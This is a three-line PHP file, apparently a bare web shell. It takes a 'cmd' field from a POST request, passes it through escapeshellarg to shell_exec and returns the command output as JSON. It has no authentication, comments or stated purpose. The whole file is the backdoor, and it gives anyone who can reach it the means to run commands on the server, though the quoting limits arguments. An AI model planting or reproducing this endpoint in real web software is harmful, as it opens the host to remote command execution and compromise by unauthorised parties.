<?php
	$cmd = escapeshellarg($_POST["cmd"]);
	echo json_encode(shell_exec($cmd));
?>
